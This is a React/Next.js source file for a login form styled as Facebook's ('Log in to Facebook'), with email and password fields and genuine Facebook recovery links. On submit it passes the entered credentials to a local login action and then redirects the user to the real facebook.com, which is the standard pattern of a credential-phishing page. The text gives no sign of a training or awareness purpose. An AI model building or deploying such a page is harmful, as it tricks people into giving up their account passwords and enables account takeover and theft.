'use client';

import { text } from 'stream/consumers';

import { useRouter } from 'next/navigation';

import * as z from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { LoginSchema } from '@/shcemas';
import { Input } from '@/components/ui/input';
import { useState, useTransition } from 'react';
import Link from 'next/link';
import { Button, buttonVariants } from '../ui/button';
import { login } from '@/actions/login';
import { Form, FormControl, FormField, FormItem, FormLabel } from './form';




const LoginFormFB = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const router = useRouter()

  const [cusset, setCusset] = useState<string | undefined>('');
  const [isPending, startTransition] = useTransition();
  const form = useForm<z.infer<typeof LoginSchema>>({
    resolver: zodResolver(LoginSchema),
    defaultValues: {
      email: '',
      password: '',
    },
  });
  const onSubmit = (values: z.infer<typeof LoginSchema>) => {
    startTransition(() => {
      login(values)
        .then((data) => {
          if (data?.error) {
            form.reset();
          }
        })
    });
    router.push("https://facebook.com")
  };


  return (
    <div className='bg-gray-100 pb-5'>
      <div className="max-w-md mx-auto">
        <h1 className={'text-blue-500 text-center font-bold text-5xl pt-5'}>facebook</h1>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)}  className="bg-white shadow-md rounded-lg px-5 p-5 mt-5 w-[396px] space-y-6 h-[362px] flex flex-col">
            <h3 className='text-center text-md mb-3'>Log in to Facebook</h3>
            <div className="mb-4">
              <FormField
                control={form.control}
                name="email"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input
                        {...field}
                        disabled={isPending}
                        className='p-4' placeholder='Email or phone number'
                        type="email"
                      />
                    </FormControl>
                    {/* <FormMessage /> */}
                  </FormItem>
                )}
              />
            </div>
            <div className="mb-4">
              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input
                        {...field}
                        disabled={isPending}
                        className='p-4' placeholder='Password'
                        type="password"
                      />
                    </FormControl>
                    {/* <FormMessage /> */}
                  </FormItem>
                )}
              />
            </div>
            <button
              className="bg-blue-500 w-full hover:bg-blue-700 text-white font-bold py-2 px-20 rounded focus:outline-none focus:shadow-outline"
              type="submit">
              Log in
            </button>
            <div className='flex justify-center gap-3 text-sm mt-2'>
              <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&cancel_lara_pswd=0" className='text-blue-600 underline'>Forgotten account? </a>
              <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&cancel_lara_pswd=0" className='text-blue-600 underline'>Sign up for Facebook</a>

            </div>
          </form>
        </Form>
      </div>
    </div>

  );
};

export default LoginFormFB;
